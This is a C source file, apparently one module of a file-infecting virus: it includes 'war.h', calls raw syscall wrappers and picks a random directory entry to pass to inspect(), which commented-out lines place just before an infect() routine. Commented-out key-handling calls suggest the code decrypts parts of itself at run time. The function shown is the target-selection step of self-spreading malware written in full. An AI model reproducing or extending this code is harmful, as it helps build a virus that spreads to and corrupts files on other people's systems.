#include "war.h"

void	locate(t_data *data, t_directory *dir)
{
//	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
//	update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
//	printf("locate key = %lx\n", data->key.one);

	int				fd;
	int				stop;
	int				limit;
	char			buf[PATH_MAX] = {0};
	char			path[BUFF_SIZE] = {0};
	linux_dirent64 *curr = NULL;

	char de[] = "locate\n";
	_write(1, de, 7);

	data->context = false;
	if (_memcpy(path, dir->path[dir->entry], _strlen(dir->path[dir->entry])) != path)
		goto ERR;

	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
		goto ERR;

   	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			dir->entry++;
		}
	}
	if (_close(fd) < 0 || dir->entry <= 0)
		goto ERR;

ITER:
	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
		goto ERR;
	if ((stop = _random_number(dir->entry)) < 0)
		goto ERR;
	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			if (stop == 0)
				break ;
			stop--;
		}
		if (stop == 0)
			break ;
	}
	if (_close(fd) < 0)
		goto ERR;
	if (*curr->d_name == '.')
		goto ITER;

	limit = _strlen(path);
	path[limit++] = '/';
	if (_memcpy(path + limit, curr->d_name, _strlen(curr->d_name)) != path + limit)
		goto ERR;
	data->context = true;

ERR:
//	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	inspect(data, path);
}
